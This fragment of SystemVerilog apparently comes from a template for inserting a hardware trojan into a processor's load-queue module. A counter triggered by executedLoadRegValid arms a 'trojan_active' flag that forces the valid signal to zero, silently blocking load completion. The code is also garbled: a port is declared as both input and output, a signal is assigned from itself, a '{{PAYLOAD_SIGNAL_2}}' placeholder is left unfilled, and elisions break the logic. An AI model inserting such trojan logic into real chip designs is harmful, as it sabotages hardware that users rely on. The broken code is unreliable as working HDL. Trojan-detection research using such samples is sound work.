...
module LoadQueue_trojan (
    input  logic clk_i,
    input  logic reset,
    
    // Original module signals (passthrough)
    input  logic executedLoadRegValid,
    output logic executedLoadRegValid,
    ...
    always_ff @(posedge clk_i or negedge reset) begin
        if (!reset) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            // Increment counter when trigger signal is active
            if (executedLoadRegValid) begin
    ...
    assign executedLoadRegValid = trojan_active ? 1'b0 : executedLoadRegValid_normal;
    ...
    logic executedLoadRegValid_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign executedLoadRegValid_normal = executedLoadRegValid;
 ...
 *     input  logic instr_valid_i,   // executedLoadRegValid
 *     output logic instr_valid_o    // executedLoadRegValid
 * );
